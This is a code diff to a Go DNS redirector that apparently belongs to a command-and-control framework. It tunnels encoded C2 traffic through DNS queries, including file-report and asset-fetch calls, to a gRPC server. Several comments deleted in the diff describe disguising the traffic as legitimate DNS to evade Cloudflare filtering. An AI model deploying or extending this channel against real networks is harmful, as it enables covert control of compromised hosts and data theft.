@@ -44,6 +44,11 @@ const (
 
 	txtMaxChunkSize = 255
 
+	// Benign DNS response configuration
+	// IP address returned for non-C2 A record queries to avoid NXDOMAIN responses
+	// which can interfere with recursive DNS lookups (e.g., Cloudflare)
+	benignARecordIP = "0.0.0.0"
+
 	// Async protocol configuration
 	MaxActiveConversations     = 10000
 	NormalConversationTimeout  = 15 * time.Minute
@@ -62,7 +67,7 @@ func init() {
 type Redirector struct {
 	conversations       sync.Map
 	baseDomains         []string
-	conversationCount   int32 // Atomic counter for active conversations
+	conversationCount   int32
 	conversationTimeout time.Duration
 }
 
@@ -127,7 +132,10 @@ func (r *Redirector) Redirect(ctx context.Context, listenOn string, upstream *gr
 				continue
 			}
 
-			go r.handleDNSQuery(ctx, conn, addr, buf[:n], upstream)
+			// Process query synchronously
+			queryCopy := make([]byte, n)
+			copy(queryCopy, buf[:n])
+			r.handleDNSQuery(ctx, conn, addr, queryCopy, upstream)
 		}
 	}
 }
@@ -218,12 +226,7 @@ func (r *Redirector) handleDNSQuery(ctx context.Context, conn *net.UDPConn, addr
 
 	domain = strings.ToLower(domain)
 
-	// Log ALL queries to track Cloudflare filtering patterns
-	if queryType == txtRecordType {
-		slog.Info("TXT query received", "domain", domain, "from", addr.String())
-	} else {
-		slog.Debug("received DNS query", "domain", domain, "query_type", queryType, "from", addr.String())
-	}
+	slog.Debug("received DNS query", "domain", domain, "query_type", queryType, "from", addr.String())
 
 	// Extract subdomain
 	subdomain, err := r.extractSubdomain(domain)
@@ -236,16 +239,14 @@ func (r *Redirector) handleDNSQuery(ctx context.Context, conn *net.UDPConn, addr
 	// Decode packet
 	packet, err := r.decodePacket(subdomain)
 	if err != nil {
-		// Silently drop queries that fail to decode - likely legitimate DNS queries or probes
-		// Cloudflare forwards all queries under our zone, not just C2 traffic
 		slog.Debug("ignoring non-C2 query", "domain", domain, "error", err)
 
-		// For A record queries, return benign IP (127.0.0.1) instead of NXDOMAIN
+		// For A record queries, return benign IP instead of NXDOMAIN
 		// Cloudflare does recursive lookups on subdomain components - if we return NXDOMAIN
-		// for the parent subdomain, it won't forward the full TXT query for INIT packets
+		// for the parent subdomain, it won't forward the full TXT query
 		if queryType == aRecordType {
 			slog.Debug("returning benign A record for non-C2 subdomain", "domain", domain)
-			r.sendDNSResponse(conn, addr, transactionID, domain, queryType, []byte{127, 0, 0, 1})
+			r.sendDNSResponse(conn, addr, transactionID, domain, queryType, net.ParseIP(benignARecordIP).To4())
 			return
 		}
 
@@ -256,12 +257,10 @@ func (r *Redirector) handleDNSQuery(ctx context.Context, conn *net.UDPConn, addr
 
 	// Validate packet type before processing
 	if packet.Type == dnspb.PacketType_PACKET_TYPE_UNSPECIFIED {
-		// Invalid/empty packet - likely parsing artifact from random domain
 		slog.Debug("ignoring packet with unspecified type", "domain", domain)
 
-		// Return benign A record for A queries to satisfy Cloudflare recursive lookups
 		if queryType == aRecordType {
-			r.sendDNSResponse(conn, addr, transactionID, domain, queryType, []byte{127, 0, 0, 1})
+			r.sendDNSResponse(conn, addr, transactionID, domain, queryType, net.ParseIP(benignARecordIP).To4())
 			return
 		}
 
@@ -285,7 +284,6 @@ func (r *Redirector) handleDNSQuery(ctx context.Context, conn *net.UDPConn, addr
 	}
 
 	if err != nil {
-		// Log as WARN since conversation-not-found is expected with UDP packet loss
 		slog.Warn("packet handling failed", "type", packet.Type, "conv_id", packet.ConversationId, "error", err)
 		r.sendErrorResponse(conn, addr, transactionID)
 		return
@@ -322,21 +320,14 @@ func (r *Redirector) extractSubdomain(domain string) (string, error) {
 	return "", fmt.Errorf("no matching base domain")
 }
 
-// decodePacket decodes DNS packet from subdomain
-// Subdomain format: <base32_encoded_protobuf_packet>.<base_domain>
-// The entire protobuf packet is base32-encoded and split into 63-char labels
 func (r *Redirector) decodePacket(subdomain string) (*dnspb.DNSPacket, error) {
-	// Remove all dots to get continuous base32 string
-	// Labels were split at 63-char boundaries, now rejoin them
 	encodedData := strings.ReplaceAll(subdomain, ".", "")
 
-	// Decode data using Base32 (case-insensitive, no padding)
 	packetData, err := base32.StdEncoding.WithPadding(base32.NoPadding).DecodeString(strings.ToUpper(encodedData))
 	if err != nil {
 		return nil, fmt.Errorf("failed to decode Base32 data: %w", err)
 	}
 
-	// Unmarshal protobuf
 	var packet dnspb.DNSPacket
 	if err := proto.Unmarshal(packetData, &packet); err != nil {
 		return nil, fmt.Errorf("failed to unmarshal protobuf: %w", err)
@@ -355,25 +346,18 @@ func (r *Redirector) decodePacket(subdomain string) (*dnspb.DNSPacket, error) {
 
 // handleInitPacket processes INIT packet
 func (r *Redirector) handleInitPacket(packet *dnspb.DNSPacket) ([]byte, error) {
-	// Atomically check and increment conversation count
-	// Loop until we successfully increment or hit the limit
 	for {
 		current := atomic.LoadInt32(&r.conversationCount)
 		if current >= MaxActiveConversations {
 			return nil, fmt.Errorf("max active conversations reached: %d", current)
 		}
-		// Try to increment atomically
 		if atomic.CompareAndSwapInt32(&r.conversationCount, current, current+1) {
-			// Successfully incremented, break out
 			break
 		}
-		// CAS failed (another goroutine modified the value), retry
 	}
 
-	// Unmarshal init payload
 	var initPayload dnspb.InitPayload
 	if err := proto.Unmarshal(packet.Data, &initPayload); err != nil {
-		// Decrement on error since we already incremented
 		atomic.AddInt32(&r.conversationCount, -1)
 		return nil, fmt.Errorf("failed to unmarshal init payload: %w", err)
 	}
@@ -384,7 +368,6 @@ func (r *Redirector) handleInitPacket(packet *dnspb.DNSPacket) ([]byte, error) {
 		return nil, fmt.Errorf("data size exceeds maximum: %d > %d bytes", initPayload.FileSize, MaxDataSize)
 	}
 
-	// Validate that FileSize is set (protobuf default is 0)
 	if initPayload.FileSize == 0 && initPayload.TotalChunks > 0 {
 		slog.Warn("INIT packet missing file_size field", "conv_id", packet.ConversationId, "total_chunks", initPayload.TotalChunks)
 	}
@@ -392,7 +375,6 @@ func (r *Redirector) handleInitPacket(packet *dnspb.DNSPacket) ([]byte, error) {
 	slog.Debug("creating conversation", "conv_id", packet.ConversationId, "method", initPayload.MethodCode,
 		"total_chunks", initPayload.TotalChunks, "file_size", initPayload.FileSize, "crc32", initPayload.DataCrc32)
 
-	// Create conversation
 	conv := &Conversation{
 		ID:               packet.ConversationId,
 		MethodPath:       initPayload.MethodCode,
@@ -406,11 +388,9 @@ func (r *Redirector) handleInitPacket(packet *dnspb.DNSPacket) ([]byte, error) {
 
 	r.conversations.Store(packet.ConversationId, conv)
 
-	slog.Info("C2 conversation started", "conv_id", conv.ID, "method", conv.MethodPath,
+	slog.Debug("C2 conversation started", "conv_id", conv.ID, "method", conv.MethodPath,
 		"total_chunks", conv.TotalChunks, "data_size", initPayload.FileSize)
 
-	// Return empty STATUS packet (no ACKs/NACKs yet) to look like legitimate DNS data
-	// Don't return plain text "ok" which could trigger Cloudflare filters
 	statusPacket := &dnspb.DNSPacket{
 		Type:           dnspb.PacketType_PACKET_TYPE_STATUS,
 		ConversationId: packet.ConversationId,
@@ -430,7 +410,6 @@ func (r *Redirector) handleInitPacket(packet *dnspb.DNSPacket) ([]byte, error) {
 func (r *Redirector) handleDataPacket(ctx context.Context, upstream *grpc.ClientConn, packet *dnspb.DNSPacket, queryType uint16) ([]byte, error) {
 	val, ok := r.conversations.Load(packet.ConversationId)
 	if !ok {
-		// Log at debug - this is normal with UDP packet loss/reordering (INIT may arrive later)
 		slog.Debug("DATA packet for unknown conversation (INIT may be lost/delayed)",
 			"conv_id", packet.ConversationId, "seq", packet.Sequence)
 		return nil, fmt.Errorf("conversation not found: %s", packet.ConversationId)
@@ -440,24 +419,20 @@ func (r *Redirector) handleDataPacket(ctx context.Context, upstream *grpc.Client
 	conv.mu.Lock()
 	defer conv.mu.Unlock()
 
-	// Validate sequence number
 	if packet.Sequence < 1 || packet.Sequence > conv.TotalChunks {
 		return nil, fmt.Errorf("sequence out of bounds: %d (expected 1-%d)", packet.Sequence, conv.TotalChunks)
 	}
 
-	// Store chunk (sequence is 1-indexed, overwrites duplicates safely)
 	conv.Chunks[packet.Sequence] = packet.Data
 	conv.LastActivity = time.Now()
 
 	slog.Debug("received chunk", "conv_id", conv.ID, "seq", packet.Sequence, "size", len(packet.Data), "total", len(conv.Chunks))
 
-	// Check if conversation is complete and auto-process
 	if uint32(len(conv.Chunks)) == conv.TotalChunks && !conv.Completed {
 		conv.Completed = true
-		slog.Info("C2 request complete, forwarding to upstream", "conv_id", conv.ID,
+		slog.Debug("C2 request complete, forwarding to upstream", "conv_id", conv.ID,
 			"method", conv.MethodPath, "total_chunks", conv.TotalChunks, "data_size", conv.ExpectedDataSize)
 
-		// Unlock before calling processCompletedConversation (it will re-lock)
 		conv.mu.Unlock()
 		if err := r.processCompletedConversation(ctx, upstream, conv, queryType); err != nil {
 			slog.Error("failed to process completed conversation", "conv_id", conv.ID, "error", err)
@@ -465,7 +440,6 @@ func (r *Redirector) handleDataPacket(ctx context.Context, upstream *grpc.Client
 		conv.mu.Lock()
 	}
 
-	// Build ACK/NACK response (STATUS packet)
 	acks, nacks := r.computeAcksNacks(conv)
 
 	statusPacket := &dnspb.DNSPacket{
@@ -475,7 +449,6 @@ func (r *Redirector) handleDataPacket(ctx context.Context, upstream *grpc.Client
 		Nacks:          nacks,
 	}
 
-	// Marshal STATUS packet to return as response
 	statusData, err := proto.Marshal(statusPacket)
 	if err != nil {
 		return nil, fmt.Errorf("failed to marshal status packet: %w", err)
@@ -489,7 +462,7 @@ func (r *Redirector) processCompletedConversation(ctx context.Context, upstream 
 	conv.mu.Lock()
 	defer conv.mu.Unlock()
 
-	// Reassemble data (chunks are 1-indexed)
+	// Reassemble data
 	var fullData []byte
 	for i := uint32(1); i <= conv.TotalChunks; i++ {
 		chunk, ok := conv.Chunks[i]
@@ -499,10 +472,8 @@ func (r *Redirector) processCompletedConversation(ctx context.Context, upstream 
 		fullData = append(fullData, chunk...)
 	}
 
-	// Verify CRC
 	actualCRC := crc32.ChecksumIEEE(fullData)
 	if actualCRC != conv.ExpectedCRC {
-		// Clean up on fatal error
 		r.conversations.Delete(conv.ID)
 		atomic.AddInt32(&r.conversationCount, -1)
 		return fmt.Errorf("data CRC mismatch: expected %d, got %d", conv.ExpectedCRC, actualCRC)
@@ -510,24 +481,19 @@ func (r *Redirector) processCompletedConversation(ctx context.Context, upstream 
 
 	slog.Debug("reassembled data", "conv_id", conv.ID, "size", len(fullData), "method", conv.MethodPath)
 
-	// Validate reassembled size matches client-provided data size (if provided)
 	if conv.ExpectedDataSize > 0 && uint32(len(fullData)) != conv.ExpectedDataSize {
-		// Clean up on fatal error
 		r.conversations.Delete(conv.ID)
 		atomic.AddInt32(&r.conversationCount, -1)
 		return fmt.Errorf("reassembled data size mismatch: expected %d bytes, got %d bytes", conv.ExpectedDataSize, len(fullData))
 	}
 
-	// Forward to upstream gRPC server
 	responseData, err := r.forwardToUpstream(ctx, upstream, conv.MethodPath, fullData)
 	if err != nil {
-		// Clean up on fatal error
 		r.conversations.Delete(conv.ID)
 		atomic.AddInt32(&r.conversationCount, -1)
 		return fmt.Errorf("failed to forward to upstream: %w", err)
 	}
 
-	// Determine max response size based on record type
 	var maxSize int
 	switch queryType {
 	case txtRecordType:
@@ -540,13 +506,10 @@ func (r *Redirector) processCompletedConversation(ctx context.Context, upstream 
 		maxSize = 400
 	}
 
-	// Check if response needs chunking
 	if len(responseData) > maxSize {
-		// Calculate CRC for full response
 		conv.ResponseCRC = crc32.ChecksumIEEE(responseData)
 		conv.ResponseData = responseData
 
-		// Split into chunks
 		conv.ResponseChunks = nil
 		for i := 0; i < len(responseData); i += maxSize {
 			end := i + maxSize
@@ -561,7 +524,6 @@ func (r *Redirector) processCompletedConversation(ctx context.Context, upstream 
 		slog.Debug("response chunked", "conv_id", conv.ID, "total_size", len(responseData),
 			"chunks", len(conv.ResponseChunks), "crc32", conv.ResponseCRC)
 	} else {
-		// Response fits in single packet
 		conv.ResponseData = responseData
 		conv.LastActivity = time.Now()
 
@@ -574,14 +536,13 @@ func (r *Redirector) processCompletedConversation(ctx context.Context, upstream 
 // computeAcksNacks computes ACK ranges and NACK list for a conversation
 // Must be called with conv.mu locked
 func (r *Redirector) computeAcksNacks(conv *Conversation) ([]*dnspb.AckRange, []uint32) {
-	// Build sorted list of received sequences
 	received := make([]uint32, 0, len(conv.Chunks))
 	for seq := range conv.Chunks {
 		received = append(received, seq)
 	}
 	sort.Slice(received, func(i, j int) bool { return received[i] < received[j] })
 
-	// Compute ACK ranges (contiguous blocks)
+	// Compute ACK ranges
 	acks := []*dnspb.AckRange{}
 	if len(received) > 0 {
 		start := received[0]
@@ -599,16 +560,13 @@ func (r *Redirector) computeAcksNacks(conv *Conversation) ([]*dnspb.AckRange, []
 		acks = append(acks, &dnspb.AckRange{StartSeq: start, EndSeq: end})
 	}
 
-	// Limit ACK ranges
 	if len(acks) > MaxAckRangesInResponse {
 		acks = acks[:MaxAckRangesInResponse]
 	}
 
-	// Compute NACKs (missing sequences in gaps)
 	nacks := []uint32{}
 
 	if len(received) > 0 {
-		// Find gaps between first and last received
 		minReceived := received[0]
 		maxReceived := received[len(received)-1]
 
@@ -647,12 +605,8 @@ func (r *Redirector) handleFetchPacket(packet *dnspb.DNSPacket) ([]byte, error) 
 
 	conv.LastActivity = time.Now()
 
-	// Check if response was chunked
 	if len(conv.ResponseChunks) > 0 {
-		// Empty data = metadata request
-		// Non-empty data = FetchPayload with 1-based chunk_index
 		if len(packet.Data) == 0 {
-			// Return ResponseMetadata
 			metadata := &dnspb.ResponseMetadata{
 				TotalChunks: uint32(len(conv.ResponseChunks)),
 				DataCrc32:   conv.ResponseCRC,
@@ -669,13 +623,11 @@ func (r *Redirector) handleFetchPacket(packet *dnspb.DNSPacket) ([]byte, error) 
 			return metadataBytes, nil
 		}
 
-		// Parse FetchPayload - chunk_index is 1-based
 		var fetchPayload dnspb.FetchPayload
 		if err := proto.Unmarshal(packet.Data, &fetchPayload); err != nil {
 			return nil, fmt.Errorf("failed to unmarshal fetch payload: %w", err)
 		}
 
-		// Convert 1-based to 0-based array index
 		chunkIndex := int(fetchPayload.ChunkIndex) - 1
 
 		if chunkIndex < 0 || chunkIndex >= len(conv.ResponseChunks) {
@@ -688,9 +640,6 @@ func (r *Redirector) handleFetchPacket(packet *dnspb.DNSPacket) ([]byte, error) 
 		return conv.ResponseChunks[chunkIndex], nil
 	}
 
-	// Single response (not chunked)
-	// Don't delete immediately - rely on timeout-based cleanup
-
 	slog.Debug("returning response", "conv_id", conv.ID, "size", len(conv.ResponseData))
 
 	return conv.ResponseData, nil
@@ -698,11 +647,9 @@ func (r *Redirector) handleFetchPacket(packet *dnspb.DNSPacket) ([]byte, error) 
 
 // forwardToUpstream sends request to gRPC server and returns response
 func (r *Redirector) forwardToUpstream(ctx context.Context, upstream *grpc.ClientConn, methodPath string, requestData []byte) ([]byte, error) {
-	// Create gRPC stream with the raw codec
 	md := metadata.New(map[string]string{})
 	ctx = metadata.NewOutgoingContext(ctx, md)
 
-	// Determine if this is a streaming method
 	isClientStreaming := methodPath == "/c2.C2/ReportFile"
 	isServerStreaming := methodPath == "/c2.C2/FetchAsset"
 
@@ -715,9 +662,7 @@ func (r *Redirector) forwardToUpstream(ctx context.Context, upstream *grpc.Clien
 		return nil, fmt.Errorf("failed to create stream: %w", err)
 	}
 
-	// Send request
 	if isClientStreaming {
-		// For client streaming (ReportFile), parse length-prefixed chunks and send individually
 		offset := 0
 		chunkCount := 0
 		for offset < len(requestData) {
@@ -725,7 +670,6 @@ func (r *Redirector) forwardToUpstream(ctx context.Context, upstream *grpc.Clien
 				break
 			}
 
-			// Read 4-byte length prefix
 			msgLen := binary.BigEndian.Uint32(requestData[offset : offset+4])
 			offset += 4
 
@@ -733,7 +677,6 @@ func (r *Redirector) forwardToUpstream(ctx context.Context, upstream *grpc.Clien
 				return nil, fmt.Errorf("invalid chunk length: %d bytes at offset %d", msgLen, offset)
 			}
 
-			// Send individual chunk (already encrypted)
 			chunk := requestData[offset : offset+int(msgLen)]
 			if err := stream.SendMsg(chunk); err != nil {
 				return nil, fmt.Errorf("failed to send chunk %d: %w", chunkCount, err)
@@ -745,7 +688,6 @@ func (r *Redirector) forwardToUpstream(ctx context.Context, upstream *grpc.Clien
 
 		slog.Debug("sent client streaming chunks", "method", methodPath, "chunks", chunkCount)
 	} else {
-		// For unary/server-streaming, send the request as-is
 		if err := stream.SendMsg(requestData); err != nil {
 			return nil, fmt.Errorf("failed to send request: %w", err)
 		}
@@ -755,16 +697,13 @@ func (r *Redirector) forwardToUpstream(ctx context.Context, upstream *grpc.Clien
 		return nil, fmt.Errorf("failed to close send: %w", err)
 	}
 
-	// Receive response(s)
 	var responseData []byte
 	if isServerStreaming {
-		// For server streaming (FetchAsset), receive multiple chunks with length prefixes
 		responseCount := 0
 		for {
 			var msg []byte
 			err := stream.RecvMsg(&msg)
 			if err != nil {
-				// Check for EOF (normal end of stream)
 				if errors.Is(err, io.EOF) {
 					break
 				}
@@ -772,7 +711,6 @@ func (r *Redirector) forwardToUpstream(ctx context.Context, upstream *grpc.Clien
 			}
 
 			if len(msg) > 0 {
-				// Add 4-byte length prefix before each response chunk
 				lengthPrefix := make([]byte, 4)
 				binary.BigEndian.PutUint32(lengthPrefix, uint32(len(msg)))
 				responseData = append(responseData, lengthPrefix...)
@@ -782,7 +720,6 @@ func (r *Redirector) forwardToUpstream(ctx context.Context, upstream *grpc.Clien
 		}
 		slog.Debug("received server streaming responses", "method", methodPath, "count", responseCount)
 	} else {
-		// For unary, receive single response
 		if err := stream.RecvMsg(&responseData); err != nil {
 			return nil, fmt.Errorf("failed to receive response: %w", err)
 		}
@@ -812,7 +749,6 @@ func (r *Redirector) parseDomainNameAndType(data []byte) (string, uint16, error)
 		offset += length
 	}
 
-	// Skip the null terminator (0x00)
 	offset++
 
 	if offset+2 > len(data) {
@@ -828,20 +764,17 @@ func (r *Redirector) parseDomainNameAndType(data []byte) (string, uint16, error)
 // sendDNSResponse sends a DNS response with appropriate record type (TXT/A/AAAA)
 // For A/AAAA records with data larger than 4/16 bytes, multiple answer records are sent
 func (r *Redirector) sendDNSResponse(conn *net.UDPConn, addr *net.UDPAddr, transactionID uint16, domain string, queryType uint16, data []byte) {
-	// For A/AAAA records, base32-encode data first (client expects to decode it)
 	if queryType == aRecordType || queryType == aaaaRecordType {
 		encoded := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(data)
 		data = []byte(encoded)
 	}
 
-	// Determine chunk size and number of answer records needed
 	var recordSize int
 	var answerCount uint16
 
 	switch queryType {
 	case txtRecordType:
-		// TXT can handle all data in one record (with internal chunking)
-		recordSize = 0 // Special case - handled separately
+		recordSize = 0
 		answerCount = 1
 	case aRecordType:
 		recordSize = 4
@@ -856,7 +789,6 @@ func (r *Redirector) sendDNSResponse(conn *net.UDPConn, addr *net.UDPAddr, trans
 			answerCount = 1
 		}
 	default:
-		// Unknown type - single empty record
 		recordSize = 0
 		answerCount = 1
 	}
@@ -871,7 +803,6 @@ func (r *Redirector) sendDNSResponse(conn *net.UDPConn, addr *net.UDPAddr, trans
 	response = append(response, 0x00, 0x00)                                   // Authority RRs: 0
 	response = append(response, 0x00, 0x00)                                   // Additional RRs: 0
 
-	// Question section - echo back the original query type
 	for _, label := range strings.Split(domain, ".") {
 		if len(label) == 0 {
 			continue
@@ -883,10 +814,8 @@ func (r *Redirector) sendDNSResponse(conn *net.UDPConn, addr *net.UDPAddr, trans
 	response = append(response, byte(queryType>>8), byte(queryType&0xFF)) // Type: original query type
 	response = append(response, 0x00, byte(dnsClassIN))                   // Class: IN
 
-	// Answer section - build multiple records for A/AAAA
 	switch queryType {
 	case txtRecordType:
-		// TXT record: single record with length-prefixed strings (split into 255-byte chunks)
 		response = append(response, byte(dnsPointer>>8), byte(dnsPointer&0xFF)) // Name pointer
 		response = append(response, byte(queryType>>8), byte(queryType&0xFF))   // Type: TXT
 		response = append(response, 0x00, byte(dnsClassIN))                     // Class: IN
@@ -894,9 +823,8 @@ func (r *Redirector) sendDNSResponse(conn *net.UDPConn, addr *net.UDPAddr, trans
 
 		var rdata []byte
 		if len(data) == 0 {
-			rdata = []byte{0x00} // Empty TXT string
+			rdata = []byte{0x00}
 		} else {
-			// Split into 255-byte chunks
 			tempData := data
 			for len(tempData) > 0 {
 				chunkSize := len(tempData)
@@ -909,22 +837,18 @@ func (r *Redirector) sendDNSResponse(conn *net.UDPConn, addr *net.UDPAddr, trans
 			}
 		}
 
-		// RDLENGTH and RDATA
 		response = append(response, byte(len(rdata)>>8), byte(len(rdata)))
 		response = append(response, rdata...)
 
 	case aRecordType:
-		// Multiple A records - 4 bytes each
 		for i := uint16(0); i < answerCount; i++ {
 			response = append(response, byte(dnsPointer>>8), byte(dnsPointer&0xFF)) // Name pointer
 			response = append(response, 0x00, byte(aRecordType))                    // Type: A
 			response = append(response, 0x00, byte(dnsClassIN))                     // Class: IN
 			response = append(response, 0x00, 0x00, 0x00, byte(dnsTTLSeconds))      // TTL
 
-			// RDLENGTH: always 4 for A records
 			response = append(response, 0x00, 0x04)
 
-			// RDATA: 4 bytes from data, padded with zeros if needed
 			start := int(i) * recordSize
 			end := start + recordSize
 			rdata := make([]byte, 4)
@@ -939,17 +863,14 @@ func (r *Redirector) sendDNSResponse(conn *net.UDPConn, addr *net.UDPAddr, trans
 		}
 
 	case aaaaRecordType:
-		// Multiple AAAA records - 16 bytes each
 		for i := uint16(0); i < answerCount; i++ {
 			response = append(response, byte(dnsPointer>>8), byte(dnsPointer&0xFF)) // Name pointer
 			response = append(response, 0x00, byte(aaaaRecordType))                 // Type: AAAA
 			response = append(response, 0x00, byte(dnsClassIN))                     // Class: IN
 			response = append(response, 0x00, 0x00, 0x00, byte(dnsTTLSeconds))      // TTL
 
-			// RDLENGTH: always 16 for AAAA records
 			response = append(response, 0x00, 0x10)
 
-			// RDATA: 16 bytes from data, padded with zeros if needed
 			start := int(i) * recordSize
 			end := start + recordSize
 			rdata := make([]byte, 16)
@@ -964,7 +885,6 @@ func (r *Redirector) sendDNSResponse(conn *net.UDPConn, addr *net.UDPAddr, trans
 		}
 
 	default:
-		// Unknown type - single empty record
 		response = append(response, byte(dnsPointer>>8), byte(dnsPointer&0xFF)) // Name pointer
 		response = append(response, byte(queryType>>8), byte(queryType&0xFF))   // Type: match query
 		response = append(response, 0x00, byte(dnsClassIN))                     // Class: IN
